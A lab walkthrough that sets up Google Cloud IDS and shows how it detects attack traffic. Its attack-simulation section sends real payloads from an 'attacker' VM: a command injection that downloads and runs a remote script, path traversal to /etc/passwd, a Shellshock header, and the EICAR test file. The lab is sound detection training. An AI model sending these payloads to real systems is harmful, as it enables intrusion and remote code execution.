---

layout: single
title:  "Getting Started with Cloud IDS"
categories: Cloud
tags: GCP
classes: wide
show_date: true
header:
  overlay_image: /assets/images/gcp-banner.png
  og_image: /assets/images/gcp-banner.png
  teaser: /assets/images/ace-gcp.png
author:
  name     : "Associate Cloud Engineer"
  avatar   : "/assets/images/ace-gcp.png"

sidebar:
  - title: "Topics"
    nav: my-sidebar

---
# Getting Started with Cloud IDS

[Cloud Intrusion Detection System (Cloud IDS)](https://cloud.google.com/intrusion-detection-system) is a next-generation advanced intrusion detection service that provides  threat detection for intrusions, malware, spyware, and  command-and-control attacks.

Cloud IDS (Cloud Intrusion Detection System) detects malware,  spyware, command-and-control attacks, and other network-based  threats. Its security efficacy is industry leading,   built with Palo Alto Networks technologies. 

- Build out a Google Cloud networking environment as shown in the previous diagram.
- Create a Cloud IDS endpoint.
- Create two virtual machines using gcloud CLI commands.
- Create a Cloud IDS packet mirroring policy.
- Simulate attack traffic from a virtual machine.
- View threat details in the Cloud console and Cloud Logging.

## Enable APIs

In this task you set the project ID variable and then enable the APIs required for the lab.

```sh
Welcome to Cloud Shell! Type "help" to get started.
Your Cloud Platform project in this session is set to qwiklabs-gcp-02-05e37a194649.
Use “gcloud config set project [PROJECT_ID]” to change to a different project.
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ export PROJECT_ID=$(gcloud config get-value project | sed '2d')
Your active configuration is: [cloudshell-17960]
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud services enable servicenetworking.googleapis.com \
    --project=$PROJECT_ID
Operation "operations/acat.p2-906497027228-5d08c05c-c92e-4a84-b289-d66d13c0b07c" finished successfully.
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud services enable ids.googleapis.com \
    --project=$PROJECT_ID
Operation "operations/acat.p2-906497027228-48a548f7-fd17-4d51-a282-9d3f8e927448" finished successfully.
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud services enable logging.googleapis.com \
    --project=$PROJECT_ID
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```



## Build the Google Cloud networking footprint

In this task, you create a Google Cloud VPC network and configure private services access.

Private services access is a private connection between your VPC  network and a network owned by Google or a third party. Google or the  third party, entities who are offering services, are also known as  service producers.

The private connection enables virtual machine (VM) instances in your VPC network and the services that you access to communicate exclusively by using internal IP addresses.

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud compute networks create cloud-ids \
--subnet-mode=custom
Created [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-02-05e37a194649/global/networks/cloud-ids].
NAME: cloud-ids
SUBNET_MODE: CUSTOM
BGP_ROUTING_MODE: REGIONAL
IPV4_RANGE: 
GATEWAY_IPV4: 

Instances on this network will not be reachable until firewall rules
are created. As an example, you can allow all internal traffic between
instances as well as SSH, RDP, and ICMP by running:

$ gcloud compute firewall-rules create <FIREWALL_NAME> --network cloud-ids --allow tcp,udp,icmp --source-ranges <IP_RANGE>
$ gcloud compute firewall-rules create <FIREWALL_NAME> --network cloud-ids --allow tcp:22,tcp:3389,icmp

student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$
```

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud compute networks subnets create cloud-ids-useast1 \
--range=192.168.10.0/24 \
--network=cloud-ids \
--region=us-east1
Created [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-02-05e37a194649/regions/us-east1/subnetworks/cloud-ids-useast1].
NAME: cloud-ids-useast1
REGION: us-east1
NETWORK: cloud-ids
RANGE: 192.168.10.0/24
STACK_TYPE: IPV4_ONLY
IPV6_ACCESS_TYPE: 
INTERNAL_IPV6_PREFIX: 
EXTERNAL_IPV6_PREFIX: 
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud compute addresses create cloud-ids-ips \
--global \
--purpose=VPC_PEERING \
--addresses=10.10.10.0 \
--prefix-length=24 \
--description="Cloud IDS Range" \
--network=cloud-ids
Created [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-02-05e37a194649/global/addresses/cloud-ids-ips].
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud services vpc-peerings connect \
--service=servicenetworking.googleapis.com \
--ranges=cloud-ids-ips \
--network=cloud-ids \
--project=$PROJECT_ID

Operation "operations/pssn.p24-906497027228-56a7ad5b-53a9-4a1f-92b6-06dcce48be5a" finished successfully.
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```



## Create a Cloud IDS endpoint

In this task you create a Cloud IDS endpoint in us-east1 with a severity set to *informational*.

Cloud IDS uses a resource known as an IDS endpoint, a zonal resource  that can inspect traffic from any zone in its region. Each IDS endpoint  receives mirrored traffic and performs threat detection analysis.

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud ids endpoints create cloud-ids-east1 \
--network=cloud-ids \
--zone=us-east1-b \
--severity=INFORMATIONAL \
--async
done: false
metadata:
  '@type': type.googleapis.com/google.cloud.ids.v1.OperationMetadata
  apiVersion: v1
  createTime: '2024-05-27T22:22:32.892705459Z'
  requestedCancellation: false
  target: projects/qwiklabs-gcp-02-05e37a194649/locations/us-east1-b/endpoints/cloud-ids-east1
  verb: create
name: projects/qwiklabs-gcp-02-05e37a194649/locations/us-east1-b/operations/operation-1716848552757-61976f41ec74f-f217c7af-5174ba72
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud ids endpoints list --project=$PROJECT_ID
ID: cloud-ids-east1
LOCATION: us-east1-b
SEVERITY: INFORMATIONAL
STATE: CREATING
NETWORK: cloud-ids
TRAFFIC_LOGS: 
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```

> The creation of the IDS endpoint takes approximately 20 minutes.

## Create Firewall rules and Cloud NAT

In this task you create two firewall rules: allow-http-icmp and allow-iap-proxy.

To enable standard http port (TCP 80) connections, and ICMP protocol  connections to the server VM from all sources in the cloud-ids network,  you define the *allow-http-icmp* rule.

To enable SSH connections to the VMs from the Identity-Aware Proxy IP range, you define the allow-iap-proxy_ rule.

You also configure Cloud Router and then configure Cloud NAT. As a  prerequisite for Cloud NAT, a Cloud Router must first be configured in  the same region. To provide internet access to VMs that don't have a  public IP address, a Cloud NAT must be created in the same region. The  VMs will be created without a public IP address to make sure that they  are inaccessible *from* the internet. However, they will need access *to* the internet to download updates and files.

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud compute firewall-rules create allow-http-icmp \
--direction=INGRESS \
--priority=1000 \
--network=cloud-ids \
--action=ALLOW \
--rules=tcp:80,icmp \
--source-ranges=0.0.0.0/0 \
--target-tags=server
Creating firewall...working..Created [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-02-05e37a194649/global/firewalls/allow-http-icmp].                               
Creating firewall...done.                                                                                                                                                          
NAME: allow-http-icmp
NETWORK: cloud-ids
DIRECTION: INGRESS
PRIORITY: 1000
ALLOW: tcp:80,icmp
DENY: 
DISABLED: False
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud compute firewall-rules create allow-iap-proxy \
--direction=INGRESS \
--priority=1000 \
--network=cloud-ids \
--action=ALLOW \
--rules=tcp:22 \
--source-ranges=35.235.240.0/20
Creating firewall...working..Created [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-02-05e37a194649/global/firewalls/allow-iap-proxy].                               
Creating firewall...done.                                                                                                                                                          
NAME: allow-iap-proxy
NETWORK: cloud-ids
DIRECTION: INGRESS
PRIORITY: 1000
ALLOW: tcp:22
DENY: 
DISABLED: False
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud compute routers create cr-cloud-ids-useast1 \
--region=us-east1 \
--network=cloud-ids
Creating router [cr-cloud-ids-useast1]...done.                                                                                                                                     
NAME: cr-cloud-ids-useast1
REGION: us-east1
NETWORK: cloud-ids
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$
```

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud compute routers nats create nat-cloud-ids-useast1 \
--router=cr-cloud-ids-useast1 \
--router-region=us-east1 \
--auto-allocate-nat-external-ips \
--nat-all-subnet-ip-ranges
Creating NAT [nat-cloud-ids-useast1] in router [cr-cloud-ids-useast1]...done.                                                                                                      
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```



## Create two virtual machines

In this task, you create two virtual machines (VMs). The first  virtual machine is your web server, which is mirroring to Cloud IDS. The second virtual machine is the source of your attack traffic.

You establish an SSH connection to your server via Identity-Aware  Proxy (IAP), check the status of your web service server, create a  benign malware file on the web server, and then add content to the file.

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud compute instances create server \
--zone=us-east1-b \
--machine-type=e2-medium \
--subnet=cloud-ids-useast1 \
--no-address \
--private-network-ip=192.168.10.20 \
--metadata=startup-script=\#\!\ /bin/bash$'\n'sudo\ apt-get\ update$'\n'sudo\ apt-get\ -qq\ -y\ install\ nginx \
--tags=server \
--image=debian-10-buster-v20210512 \
--image-project=debian-cloud \
--boot-disk-size=10GB
WARNING: You have selected a disk size of under [200GB]. This may result in poor I/O performance. For more information, see: https://developers.google.com/compute/docs/disks#performance.
Created [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-02-05e37a194649/zones/us-east1-b/instances/server].
WARNING: Some requests generated warnings:
 - The resource 'projects/debian-cloud/global/images/debian-10-buster-v20210512' is deprecated. A suggested replacement is 'projects/debian-cloud/global/images/debian-10-buster-v20210609'.

NAME: server
ZONE: us-east1-b
MACHINE_TYPE: e2-medium
PREEMPTIBLE: 
INTERNAL_IP: 192.168.10.20
EXTERNAL_IP: 
STATUS: RUNNING
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud compute instances create attacker \
--zone=us-east1-b \
--machine-type=e2-medium \
--subnet=cloud-ids-useast1 \
--no-address \
--private-network-ip=192.168.10.10 \
--image=debian-10-buster-v20210512 \
--image-project=debian-cloud \
--boot-disk-size=10GB
WARNING: You have selected a disk size of under [200GB]. This may result in poor I/O performance. For more information, see: https://developers.google.com/compute/docs/disks#performance.
Created [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-02-05e37a194649/zones/us-east1-b/instances/attacker].
WARNING: Some requests generated warnings:
 - The resource 'projects/debian-cloud/global/images/debian-10-buster-v20210512' is deprecated. A suggested replacement is 'projects/debian-cloud/global/images/debian-10-buster-v20210609'.

NAME: attacker
ZONE: us-east1-b
MACHINE_TYPE: e2-medium
PREEMPTIBLE: 
INTERNAL_IP: 192.168.10.10
EXTERNAL_IP: 
STATUS: RUNNING
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud compute ssh server --zone=us-east1-b --tunnel-through-iap
WARNING: The private SSH key file for gcloud does not exist.
WARNING: The public SSH key file for gcloud does not exist.
WARNING: You do not have an SSH key for gcloud.
WARNING: SSH keygen will be executed to generate a key.
This tool needs to create the directory [/home/student_01_41d0c1af2373/.ssh] before being able to generate SSH keys.

Do you want to continue (Y/n)?  y

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/student_01_41d0c1af2373/.ssh/google_compute_engine
Your public key has been saved in /home/student_01_41d0c1af2373/.ssh/google_compute_engine.pub
The key fingerprint is:
SHA256:1jVp22PAH8stFpLV0eSxT1NpKd1Lvp8SdpV/MK0YfvI student_01_41d0c1af2373@cs-295826878337-default
The key's randomart image is:
+---[RSA 3072]----+
|              o=O|
|           . = BB|
|            X B+=|
|         . o.OoX=|
|        S ...oX+*|
|       .    +=o=o|
|            .+o +|
|             .E..|
|              .  |
+----[SHA256]-----+
WARNING: 

To increase the performance of the tunnel, consider installing NumPy. For instructions,
please see https://cloud.google.com/iap/docs/using-tcp-forwarding#increasing_the_tcp_upload_bandwidth

Warning: Permanently added 'compute.7244727567863297623' (ED25519) to the list of known hosts.
Linux server 4.19.0-16-cloud-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Creating directory '/home/student-01-41d0c1af2373'.
student-01-41d0c1af2373@server:~$ sudo systemctl status nginx
● nginx.service - A high performance web server and a reverse proxy server
   Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)
   Active: active (running) since Mon 2024-05-27 22:27:43 UTC; 1min 17s ago
     Docs: man:nginx(8)
 Main PID: 1785 (nginx)
    Tasks: 3 (limit: 4649)
   Memory: 5.9M
   CGroup: /system.slice/nginx.service
           ├─1785 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
           ├─1786 nginx: worker process
           └─1787 nginx: worker process

May 27 22:27:43 server systemd[1]: Starting A high performance web server and a reverse proxy server...
student-01-41d0c1af2373@server:~$ cd /var/www/html/
student-01-41d0c1af2373@server:/var/www/html$ sudo touch eicar.file
student-01-41d0c1af2373@server:/var/www/html$ echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee eicar.file
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
student-01-41d0c1af2373@server:/var/www/html$ cat eicar.file 
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
student-01-41d0c1af2373@server:/var/www/html$ 
student-01-41d0c1af2373@server:/var/www/html$ exit
logout
Connection to compute.7244727567863297623 closed.
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```



## Create a Cloud IDS packet mirroring policy

In this task, you create a Cloud IDS packet mirroring policy. This  policy determines what traffic is mirrored to the Cloud IDS. You will  then attach this policy to the newly created Cloud IDS endpoint.

As mentioned earlier, the Cloud IDS endpoint creation takes some  time.  Before you can proceed with this lab, the endpoint must be in an  active/ready state.

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
STATE: CREATING
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
STATE: CREATING
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
STATE: CREATING
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
STATE: CREATING
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
STATE: CREATING
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
STATE: READY
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 --zone=us-east1-b --format="value(endpointForwardingRule)")
echo $FORWARDING_RULE
https://www.googleapis.com/compute/v1/projects/i505faaab483219d6-tp/regions/us-east1/forwardingRules/ids-fr-cloud--dwoamrfsm8fa5gid
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \
--region=us-east1 \
--collector-ilb=$FORWARDING_RULE \
--network=cloud-ids \
--mirrored-subnets=cloud-ids-useast1
Created [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-02-05e37a194649/regions/us-east1/packetMirrorings/cloud-ids-packet-mirroring].
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud compute packet-mirrorings list
NAME: cloud-ids-packet-mirroring
REGION: us-east1
NETWORK: cloud-ids
ENABLE: TRUE
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```



## Simulate attack traffic

In this task, you establish an SSH connection to your attacked  virtual machine and simulate attack traffic from a virtual machine to  your server. You do this by running a selection of `curl` commands that range from low severity to critical severity.

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap
WARNING: 

To increase the performance of the tunnel, consider installing NumPy. For instructions,
please see https://cloud.google.com/iap/docs/using-tcp-forwarding#increasing_the_tcp_upload_bandwidth

Warning: Permanently added 'compute.1860123581354653234' (ED25519) to the list of known hosts.
Linux attacker 4.19.0-16-cloud-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Creating directory '/home/student-01-41d0c1af2373'.
student-01-41d0c1af2373@attacker:~$ curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.14.2</center>
</body>
</html>
student-01-41d0c1af2373@attacker:~$ curl http://192.168.10.20/?item=../../../../WINNT/win.ini
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
student-01-41d0c1af2373@attacker:~$ curl http://192.168.10.20/eicar.file
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
student-01-41d0c1af2373@attacker:~$ curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.14.2</center>
</body>
</html>
student-01-41d0c1af2373@attacker:~$ curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.14.2</center>
</body>
</html>
student-01-41d0c1af2373@attacker:~$ exit
logout
Connection to compute.1860123581354653234 closed.
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```



## Review threats detected by Cloud IDS

In this task, you review the various attack traffic captured by the  Cloud IDS in the Cloud console. The captured attack traffic profiles  provide details of each threat.

1. In the Google Cloud console, in the **Navigation menu** (![Navigation menu](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **Network Security > Cloud IDS**.
2. Click the **Threats** tab.

The Cloud IDS captured various attack traffic profiles and provided the details on each threat. You may need to click **Refresh** if you do not see any threats.  You now dive a little deeper and view threat details.

Locate the **Bash Remote Code Execution Vulnerability** threat, click **More** (![More Button](https://cdn.qwiklabs.com/2ufrDePg5inKfodUoT2Kib4oE7II7emYn%2BypCC85FjQ%3D)), and then select **View threat details**. A new Cloud Logging tab opens that displays the same details. This  enables you to send the logs to Cloud Storage, Chronicle, or any  SIEM/SOAR. You can also create custom workflows to take remediation  action based on alerts, like creating a Cloud Function that triggers on  an alert and creating or updating a firewall rule to block the IP  address, or creating or updating a Google Cloud Armor policy.

```json
{
  "insertId": "619773b7c7c57695861ebb663cd0a648-1@a1",
  "jsonPayload": {
    "ip_protocol": "tcp",
    "session_id": "282",
    "network": "cloud-ids",
    "repeat_count": "1",
    "destination_port": "80",
    "direction": "client-to-server",
    "application": "web-browsing",
    "destination_ip_address": "192.168.10.20",
    "cves": [
      "CVE-2014-6271",
      "CVE-2014-7169",
      "CVE-2014-6277",
      "CVE-2014-6278"
    ],
    "threat_id": "36729",
    "alert_severity": "CRITICAL",
    "type": "vulnerability",
    "alert_time": "2024-05-27T22:42:30Z",
    "source_port": "59186",
    "uri_or_filename": "test-critical",
    "source_ip_address": "192.168.10.10",
    "name": "Bash Remote Code Execution Vulnerability",
    "details": "Bash is prone to a remote code Execution vulnerability while handling environment variables. The vulnerability is due to improper checks while handling environment variables which causes the remote code execution. An attacker could exploit the vulnerability by sending a crafted HTTP request. A successful attack could lead to a remote code execution that uses the privileges of the user.",
    "category": "code-execution"
  },
  "resource": {
    "type": "ids.googleapis.com/Endpoint",
    "labels": {
      "resource_container": "projects/906497027228",
      "id": "cloud-ids-east1",
      "location": "us-east1-b"
    }
  },
  "timestamp": "2024-05-27T22:42:30Z",
  "logName": "projects/qwiklabs-gcp-02-05e37a194649/logs/ids.googleapis.com%2Fthreat",
  "receiveTimestamp": "2024-05-27T22:42:33.114329769Z"
}
```

```json
{
  "insertId": "6197739ff3b8c91fb27277bf8ae61fdd-1@a2",
  "jsonPayload": {
    "alert_severity": "MEDIUM",
    "destination_port": "80",
    "category": "code-execution",
    "network": "cloud-ids",
    "type": "vulnerability",
    "alert_time": "2024-05-27T22:42:05Z",
    "session_id": "263",
    "name": "Eicar File Detected",
    "destination_ip_address": "192.168.10.20",
    "threat_id": "39040",
    "source_ip_address": "192.168.10.10",
    "source_port": "59182",
    "uri_or_filename": "eicar.file",
    "ip_protocol": "tcp",
    "details": "This signature indicates an Eicar file has been detected.",
    "application": "web-browsing",
    "direction": "server-to-client",
    "repeat_count": "1"
  },
  "resource": {
    "type": "ids.googleapis.com/Endpoint",
    "labels": {
      "resource_container": "projects/906497027228",
      "id": "cloud-ids-east1",
      "location": "us-east1-b"
    }
  },
  "timestamp": "2024-05-27T22:42:05Z",
  "logName": "projects/qwiklabs-gcp-02-05e37a194649/logs/ids.googleapis.com%2Fthreat",
  "receiveTimestamp": "2024-05-27T22:42:09.138445941Z"
}
```

## History

```sh
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ history 
    1  export PROJECT_ID=$(gcloud config get-value project | sed '2d')
    2  gcloud services enable servicenetworking.googleapis.com     --project=$PROJECT_ID
    3  gcloud services enable ids.googleapis.com     --project=$PROJECT_ID
    4  gcloud services enable logging.googleapis.com     --project=$PROJECT_ID
    5  gcloud compute networks create cloud-ids --subnet-mode=custom
    6  gcloud compute networks subnets create cloud-ids-useast1 --range=192.168.10.0/24 --network=cloud-ids --region=us-east1
    7  gcloud compute addresses create cloud-ids-ips --global --purpose=VPC_PEERING --addresses=10.10.10.0 --prefix-length=24 --description="Cloud IDS Range" --network=cloud-ids
    8  gcloud services vpc-peerings connect --service=servicenetworking.googleapis.com --ranges=cloud-ids-ips --network=cloud-ids --project=$PROJECT_ID
    9  gcloud ids endpoints create cloud-ids-east1 --network=cloud-ids --zone=us-east1-b --severity=INFORMATIONAL --async
   10  gcloud ids endpoints list --project=$PROJECT_ID
   11  gcloud compute firewall-rules create allow-http-icmp --direction=INGRESS --priority=1000 --network=cloud-ids --action=ALLOW --rules=tcp:80,icmp --source-ranges=0.0.0.0/0 --target-tags=server
   12  gcloud compute firewall-rules create allow-iap-proxy --direction=INGRESS --priority=1000 --network=cloud-ids --action=ALLOW --rules=tcp:22 --source-ranges=35.235.240.0/20
   13  gcloud compute routers create cr-cloud-ids-useast1 --region=us-east1 --network=cloud-ids
   14  gcloud compute routers nats create nat-cloud-ids-useast1 --router=cr-cloud-ids-useast1 --router-region=us-east1 --auto-allocate-nat-external-ips --nat-all-subnet-ip-ranges
   15  gcloud compute instances create server --zone=us-east1-b --machine-type=e2-medium --subnet=cloud-ids-useast1 --no-address --private-network-ip=192.168.10.20 --metadata=startup-script=\#\!\ /bin/bash$'\n'sudo\ apt-get\ update$'\n'sudo\ apt-get\ -qq\ -y\ install\ nginx --tags=server --image=debian-10-buster-v20210512 --image-project=debian-cloud --boot-disk-size=10GB
   16  gcloud compute instances create attacker --zone=us-east1-b --machine-type=e2-medium --subnet=cloud-ids-useast1 --no-address --private-network-ip=192.168.10.10 --image=debian-10-buster-v20210512 --image-project=debian-cloud --boot-disk-size=10GB
   17  gcloud compute ssh server --zone=us-east1-b --tunnel-through-iap
   18  gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
   19  gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
   20  gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
   21  gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
   22  gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
   23  gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
   24  export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 --zone=us-east1-b --format="value(endpointForwardingRule)")
   25  echo $FORWARDING_RULE
   26  gcloud compute packet-mirrorings create cloud-ids-packet-mirroring --region=us-east1 --collector-ilb=$FORWARDING_RULE --network=cloud-ids --mirrored-subnets=cloud-ids-useast1
   27  gcloud compute packet-mirrorings list
   28  gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap
   29  history 
student_01_41d0c1af2373@cloudshell:~ (qwiklabs-gcp-02-05e37a194649)$ 
```

